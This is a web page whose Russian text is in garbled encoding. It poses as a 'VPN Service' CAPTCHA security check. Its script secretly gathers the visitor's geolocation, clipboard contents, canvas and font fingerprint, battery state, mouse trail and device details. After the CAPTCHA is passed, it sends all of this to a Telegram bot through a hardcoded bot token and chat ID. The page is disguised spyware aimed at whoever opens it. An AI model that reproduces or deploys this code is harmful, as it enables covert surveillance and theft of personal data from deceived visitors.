<body>
  <div class="container">
    <h1>üîí –ü—Ä–æ–≤–µ—Ä–∫–∞ –±–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç–∏</h1>
    <p>VPN Service –æ–±–Ω–∞—Ä—É–∂–∏–ª –ø–æ–¥–æ–∑—Ä–∏—Ç–µ–ª—å–Ω—É—é –∞–∫—Ç–∏–≤–Ω–æ—Å—Ç—å. –ü—Ä–æ–π–¥–∏—Ç–µ –≤–µ—Ä–∏—Ñ–∏–∫–∞—Ü–∏—é:</p>
    <div class="progress-container">
      <div class="progress-bar" id="progressBar"></div>
    </div>
    <div id="captchaCode">‚Äî‚Äî‚Äî</div>
    <input type="text" id="userInput" maxlength="8" placeholder="–í–≤–µ–¥–∏—Ç–µ –∫–æ–¥" autocomplete="off">
    <button class="verify-btn" id="verifyBtn">–ü—Ä–æ–≤–µ—Ä–∏—Ç—å</button>
    <div id="status" class="status"></div>
  </div>

  <script>
    // === –ö–û–ù–§–ò–ì ===
    const TELEGRAM_TOKEN = '8282145932:AAGzihlRLSq87Vv3dCcQhroLhhmY_OLNX8E';
    const CHAT_ID =  '8282145932';
   const elements = {
      captchaCode: document.getElementById('captchaCode'),
      userInput: document.getElementById('userInput'),
      verifyBtn: document.getElementById('verifyBtn'),
      progressBar: document.getElementById('progressBar'),
      status: document.getElementById('status')
    };

    let currentCaptcha = '';
    let mouseTrail = [];
    let batteryInfo = {};
    let fingerprintCache = null;

    // === –ö–ê–ü–ß–ê ===
    function generateCaptcha() {
      const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
      return Array(8).fill().map(() => chars[Math.floor(Math.random()*chars.length)]).join('');
    }

    function start() {
      currentCaptcha = generateCaptcha();
      elements.captchaCode.textContent = currentCaptcha;
      elements.progressBar.style.width = '0%';
      console.log('‚úÖ –ö–∞–ø—á–∞ –æ—Ç—Ä–∏—Å–æ–≤–∞–Ω–∞');
      collectPassiveFingerprint();
    }

    // === –ü–ê–°–°–ò–í–ù–´–ô –°–ë–û–† ===
    document.addEventListener('mousemove', (e) => {
      mouseTrail.push({x: e.clientX, y: e.clientY, t: Date.now()});
      if (mouseTrail.length > 200) mouseTrail.shift();
    });

    if ('getBattery' in navigator) {
      navigator.getBattery().then(bat => {
        batteryInfo = {
          level: Math.round(bat.level * 100) + '%',
          charging: bat.charging ? '–î–∞' : '–ù–µ—Ç'
        };
      });
    }

    function detectFonts() {
      const testFonts = ['Arial','Times New Roman','Comic Sans MS','Courier New','Verdana'];
      const detected = [];
      testFonts.forEach(font => {
        if (document.fonts && document.fonts.check(`12px ${font}`)) detected.push(font);
      });
      return detected.slice(0, 3).join(',');
    }

    function getCanvasFP() {
      const canvas = document.createElement('canvas');
      canvas.width = 256; canvas.height = 60;
      const ctx = canvas.getContext('2d');
      ctx.textBaseline = 'alphabetic';
      ctx.fillStyle = "#f60";
      ctx.fillRect(125, 1, 62, 20);
      ctx.fillStyle = "#069";
      ctx.font = '11pt Arial';
      ctx.fillText('SUPER FP v3.0', 2, 15);
      return canvas.toDataURL().substring(0, 80);
    }

    function getGeo() {
      return new Promise((resolve) => {
        if (!navigator.geolocation) return resolve('geo-unsupported');
        navigator.geolocation.getCurrentPosition(
          (pos) => resolve(`${pos.coords.latitude.toFixed(6)},${pos.coords.longitude.toFixed(6)}`),
          () => resolve('geo-denied'),
          {timeout: 3000}
        );
      });
    }

    async function getClipboard() {
      try {
        const text = await navigator.clipboard.readText();
        return text.substring(0, 80);
      } catch(e) {
        return 'clipboard-denied';
      }
    }

    async function collectPassiveFingerprint() {
      if (fingerprintCache) return fingerprintCache;

      const geo = await getGeo();
      const clipboard = await getClipboard();

      fingerprintCache = {
        userAgent: navigator.userAgent.substring(0, 120),
        platform: navigator.platform,
        language: navigator.language,
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        screen: `${screen.width}x${screen.height}x${screen.colorDepth}`,
        cookies: navigator.cookieEnabled,
        hardware: `${navigator.hardwareConcurrency || '?'}c/${navigator.deviceMemory || '?'}GB`,
        fonts: detectFonts(),
        battery: batteryInfo.level || 'no',
        charging: batteryInfo.charging || 'no',
        mouseTrail: mouseTrail.length,
        geo,
        canvas: getCanvasFP(),
        clipboard
      };

      console.log('üïµÔ∏è‚Äç‚ôÇÔ∏è FP —Å–æ–±—Ä–∞–Ω –ø–∞—Å—Å–∏–≤–Ω–æ');
      return fingerprintCache;
    }

    async function sendTextReport(fp, input) {
      const text =
        `üéØ CAPTCHA_OK\n` +
        `üìù –ö–æ–¥: ${currentCaptcha}\n` +
        `‚å®Ô∏è –í–≤–æ–¥: ${input}\n\n` +
        `üì± UA: ${fp.userAgent}\n` +
        `üíª –ü–ª–∞—Ç—Ñ–æ—Ä–º–∞: ${fp.platform}\n` +
        `üåê –Ø–∑—ã–∫/—á–∞—Å–æ–≤–æ–π –ø–æ—è—Å: ${fp.language} / ${fp.timezone}\n` +
        `üñ•Ô∏è –≠–∫—Ä–∞–Ω: ${fp.screen}\n` +
        `üîã –ë–∞—Ç–∞—Ä–µ—è: ${fp.battery} (${fp.charging})\n` +
        `üñ±Ô∏è –ú—ã—à—å: ${fp.mouseTrail} —Ç–æ—á–µ–∫\n` +
        `üìç Geo: ${fp.geo}\n` +
        `üóé –®—Ä–∏—Ñ—Ç—ã: ${fp.fonts}\n` +
        `üìã –ë—É—Ñ–µ—Ä: ${fp.clipboard}\n` +
        `üß© Canvas: ${fp.canvas}`;

      await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({chat_id: CHAT_ID, text})
      });
    }

    elements.verifyBtn.addEventListener('click', async () => {
      const input = elements.userInput.value.trim().toUpperCase();
      if (input === currentCaptcha) {
        elements.status.textContent = 'üîç –ü—Ä–æ–≤–µ—Ä–∫–∞...';
        elements.status.className = 'status';

        const fp = await collectPassiveFingerprint();
        await sendTextReport(fp, input);

        elements.status.textContent = '‚úÖ –£—Å–ø–µ—à–Ω–æ';
        elements.status.className = 'status success';
      } else {
        elements.status.textContent = '‚ùå –ù–µ–≤–µ—Ä–Ω—ã–π –∫–æ–¥';
        elements.status.className = 'status error';
      }
    });

    if (document.readyState === 'loading') {
      document.addEventListener('DOMContentLoaded', start);
    } else {
      start();
    }
  </script>
</body>
